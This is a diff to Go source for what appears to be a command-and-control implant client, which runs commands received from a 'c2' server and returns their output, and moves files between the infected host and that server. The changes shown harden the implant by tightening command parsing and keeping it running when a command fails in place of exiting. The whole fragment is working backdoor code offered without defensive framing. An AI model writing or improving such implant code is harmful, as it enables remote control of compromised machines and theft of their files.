@@ -7,7 +7,6 @@ import (
 	"fmt"
 	"io"
 	"io/ioutil"
-	"log"
 	"mime/multipart"
 	"net/http"
 	"os"
@@ -72,12 +71,12 @@ func ProcessCmd(client *http.Client, cmd string, host string) {
 	if strings.Compare(cmd, "quit") == 0 {
 		fmt.Println("[+] Quitting due to quit cmd from c2")
 		os.Exit(0)
-	} else if strings.Contains(cmd, "upload") {
+	} else if strings.HasPrefix(cmd, "upload") {
 		cmdTokens := strings.Split(cmd, " ")
 		localFilePath := cmdTokens[1]
 		remoteFilePath := cmdTokens[2]
 		UploadFile(client, host+uploadFileURL, localFilePath, remoteFilePath)
-	} else if strings.Contains(cmd, "download") {
+	} else if strings.HasPrefix(cmd, "download") {
 		cmdTokens := strings.Split(cmd, " ")
 		remoteFilePath := cmdTokens[1]
 		localFilePath := cmdTokens[2]
@@ -166,10 +165,12 @@ func DownloadFile(client *http.Client, url string, filePath string) {
 func ExecAndGetOutput(cmdString string) []byte {
 	fmt.Println("[+] Executing cmd...")
 	cmdTokens := strings.Split(cmdString, " ")
+	fmt.Println(cmdTokens)
 	cmd := exec.Command(cmdTokens[0], cmdTokens[1:]...)
 	out, err := cmd.CombinedOutput()
 	if err != nil {
-		log.Fatalf("cmd.Run() failed with %s\n", err)
+		fmt.Printf("[-] Failed to execute cmd with error: %s\n", err)
+		out = []byte("Failed to execute cmd")
 	}
 	return out
 }
